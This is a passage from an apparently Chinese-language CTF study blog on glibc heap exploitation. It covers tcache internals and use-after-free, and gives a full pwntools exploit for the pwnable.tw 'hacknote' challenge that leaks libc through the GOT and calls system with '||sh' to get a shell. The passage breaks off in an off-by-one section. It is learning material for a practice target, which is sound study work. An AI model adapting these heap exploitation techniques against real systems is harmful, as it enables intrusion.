mp_.tcache_count<br> &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))<br>malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);<br>      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>*fb = REVEAL_PTR (tc_victim-&gt;fd);<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  REMOVE_FB (fb, pp, tc_victim);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      tcache_put (tc_victim, tc_idx);<br>    &#125;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p>（2）其次，申请的内存块符合 smallbin 大小时并且在 smallbin 内找到可用的空闲块时，会把该 smallbin 链上的其他内存块放入 tcache 中。<a href="https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3914">source</a> </p><p>（3）当在 unsorted bin 链上循环处理时，当找到大小一致的chunk时，并不直接返回，而是先放到 tcache 中，继续处理。<a href="https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L4052">source</a> </p><p>   (4)  unsorted bin大循环里如果达到放入tcache块达到最大数量，会立即返回。默认是 0，即不存在上限。</p><p>   (5)  在循环处理 unsorted bin 内存块后，如果之前曾放入过 tcache 块，则会取出一个并返回。通过<code>return_cached</code>变量. </p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>看一下 <code>tcache_get()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">// 获得一个 chunk，counts 减一</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br><br><span class="hljs-comment">//2.31</span><br><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</li><li>少掉的两个assert在调用函数之前已经检查过, 写了个appease gcc, 就当是不存在吧.</li></ul><h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><p>看完申请，再看看有 tcache 时的释放</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>__libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  ......<br>  ......<br>  MAYBE_INIT_TCACHE ();<br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</li></ul><h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free()"></a>_int_free()</h3><p>跟进 <code>_int_free()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  ......<br>  ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache<br>        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 64</span><br>        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="hljs-comment">// 7</span><br>      &#123;<br>        tcache_put (p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  ......<br>  ......<br></code></pre></div></td></tr></table></figure><ul><li>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</li></ul><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  <span class="hljs-comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span><br><span class="hljs-comment">     detect a double free.  */</span><br>  e-&gt;key = tcache;<br><br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</li></ul><h2 id="利用之处"><a href="#利用之处" class="headerlink" title="利用之处"></a>利用之处</h2><ul><li>tcache poisoning: 就是简单的修改next指针.</li><li>tcache dup: 多次释放</li><li>smallbin unlink: 在smallbin中遍历找到chunk时也会将其他相同大小的chunk放到tcache, 然而缺少检查. 不熟悉</li><li>tcache stashing unlink attack: 不熟悉</li></ul><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong> </p><h2 id="例子-–-pwnable-tw-hacknote"><a href="#例子-–-pwnable-tw-hacknote" class="headerlink" title="例子 – pwnable.tw_hacknote"></a>例子 – pwnable.tw_hacknote</h2><p>题目在 <a href="../../files/hacknote.zip">这里</a> 下载</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> root @ Kiprey <span class="hljs-keyword">in</span> ~/Desktop/Pwn [14:16:43]</span><br><span class="hljs-meta">$</span><span class="bash"> checksec hacknote</span>  <br>[*] &#x27;/root/Desktop/Pwn/hacknote&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></div></td></tr></table></figure><h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( dword_804A04C &lt;= <span class="hljs-number">5</span> )  <span class="hljs-comment">//最多放五个chunk</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) ) <span class="hljs-comment">//如果该位置为空, 猜测应该是一个数组, 元素是指向chunk的指针</span><br>      &#123;<br>        *(&amp;ptr + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>); <span class="hljs-comment">//malloc了八字节</span><br>        <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        *(_DWORD *)*(&amp;ptr + i) = sub_804862B; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = (<span class="hljs-keyword">int</span>)*(&amp;ptr + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-comment">//这里可以知道数组元素指向一个结构体, 这个结构体有两个指针</span><br>          <span class="hljs-comment">//第一个是函数sub_804862B的指针, 第二个是content指针,malloc出来的</span><br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *((<span class="hljs-keyword">void</span> **)*(&amp;ptr + i) + <span class="hljs-number">1</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++dword_804A04C;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sub_80487D4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)*(&amp;ptr + v1) + <span class="hljs-number">1</span>));<span class="hljs-comment">//先freecontent</span><br>    <span class="hljs-built_in">free</span>(*(&amp;ptr + v1));<span class="hljs-comment">//再free chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>); <span class="hljs-comment">//并未设置NULL</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>    <span class="hljs-comment">//&amp;ptr + v1是函数指针的地址,解引用后得到改地址上的函数指针, 前面的是函数头</span><br>    <span class="hljs-comment">//就是调用存在改地址的put函数</span><br>    (*(<span class="hljs-keyword">void</span> (__cdecl **)(_DWORD))*(&amp;ptr + v1)) (*(&amp;ptr + v1));<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul><li><p class="note note-info"><strong>UAF--use after free</strong>, 要在free后再次使用一般是在free后指针并未设置为NULL. 这是UAF一个很明显的标志</p> </li><li><p>这里的delete函数中就没有在free后面设置NULL, 我们可以利用fastbin链的特性，来使一个可修改的指针指向某个被释放的note的func成员指针，进而修改该指针并执行其指向的函数</p></li><li><p>过程分析:</p><ol><li>我们可以先声明两个note，分别称为note0、note1，注意这两个note的content size必须&gt;12， 这样content chunk<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><span class="hint--top hint--rounded" aria-label="与上条类似，我们同样将分配作为content的chunk称为content chunk">[1]</span></a></sup>的大小就会 <strong>大于</strong> note chunk<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><span class="hint--top hint--rounded" aria-label="为了方便，我们将分配作为note的chunk称为note chunk">[2]</span></a></sup>的大小 . <u>此时note chunk的user size为(8+4)bytes, content chunk的user size为(申请的大小+4)</u> </li></ol><div class="hljs code-wrapper"><pre><code>如此，当这两个note都被释放时，两个note的note chunk会放置进相同索引的fast bin链里，而另外两个content chunk则会放置进 **另一个索引** 的fast bin链里。 note chunk 和 content chunk 在fast bin链中互不干扰</code></pre></div><ol start="2"><li>第二步就是新建一个新的note2，注意该note的content size要&lt;=12分配到<strong>fastbin上note1</strong>的空间，成为note2的content chunk</li><li><strong>注意</strong>：当程序可以执行system函数时，注意传入的地址为note2的地址，所以<code>[system addr]</code> 以及其后4个字节都会被解释成字符串尝试执行。但[system addr]又必须保留，那该如何get shell呢？<br> 这里有个小技巧，我们可以在最后四个字节构造<code>&quot;||sh&quot;</code>。这样便会执行<code>system(&quot;[system addr]||sh&quot;)</code><br> 由于<code>[system addr]</code>肯定执行失败，所以便会执行到后面的<code>sh</code>。这样便可以get shell</li></ol></li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol><li><p>新建note0、note1，其note size必须大于12</p></li><li><p>释放note0、note1</p></li><li><p>新建note2，其note size必须&lt;=12。</p><p>此时note2-&gt;content指针就会指向note1，在新建的过程中，便可修改内存上的内存。</p><ul><li>修改note1-&gt;func为puts()函数（func指针默认设置的函数)</li><li>修改note1-&gt;content为<code>got@__libc_start_main</code>（随便哪个已经延迟绑定过的函数都行）</li></ul></li><li><p>输出note1的内容（print note1），从而泄露libc基地址，进而确定<code>system</code>函数的地址</p></li><li><p>释放note2并重新建立note2，其note size仍然必须&lt;=12</p><p>在建立note2过程中，修改以下内容</p><ul><li>修改note1-&gt;func为<code>system</code>函数</li><li>修改note1-&gt;content为<code>&quot;||sh&quot;</code>字符串</li></ul></li><li><p>输出note1的内容（print note1） 执行system(“sh”)， get shell！</p></li></ol><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = remote(<span class="hljs-string">&quot;chall.pwnable.tw&quot;</span>, <span class="hljs-number">10102</span>)<br><br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./hacknote&quot;</span>)<br><br>context(terminal=[<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>], os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86&#x27;</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addnote</span>(<span class="hljs-params"><span class="hljs-built_in">len</span>, content</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Note size :&quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>))<br>    io.sendlineafter(<span class="hljs-string">&quot;Content :&quot;</span>, content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printnote</span>(<span class="hljs-params">index</span>):</span><br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment"># 新建note0和note1并删除，注意删除顺序</span><br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>delnote(<span class="hljs-number">1</span>)<br>delnote(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># 新建note2，写入数据并执行</span><br>addnote(<span class="hljs-number">8</span>, flat(<span class="hljs-number">0x0804862B</span>, e.got[<span class="hljs-string">&#x27;read&#x27;</span>]))<br>printnote(<span class="hljs-number">1</span>)<br> <span class="hljs-comment"># 上一步泄露出了libc地址，处理得到system函数地址</span><br>libc_read_addr = u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;libc read addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_read_addr))<br><span class="hljs-comment"># 删除note2</span><br>delnote(<span class="hljs-number">2</span>)<br><br>libcbase_addr = libc_read_addr - libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>system_addr = libcbase_addr + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>log.success(<span class="hljs-string">&#x27;libcbase addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(libcbase_addr))<br>log.success(<span class="hljs-string">&#x27;system addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(system_addr))<br><span class="hljs-comment"># gdb.attach(io)</span><br><span class="hljs-comment"># 重新建立note2，写入system地址和&#x27;||sh&#x27;字符串，执行函数</span><br>addnote(<span class="hljs-number">8</span>, flat(system_addr, <span class="hljs-string">&#x27;||sh&#x27;</span>)) <span class="hljs-comment"># 8或者12都是可以的</span><br><br>printnote(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># get shell！</span><br>io.interactive()<br></code></pre></div></td></tr></table></figure><h1 id="Off-by-one"><a href="#Off-by-one" class="headerlink" title="Off-by-one"></a>Off-by-one</h1><ol><li>溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</li><li>溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 <code>prev_in_use</code> 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 <code>prev_size</code> 域就会启用，就可以伪造 <code>prev_size</code> ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 <code>prev_size</code> 找到的块的大小与<code>prev_size</code> 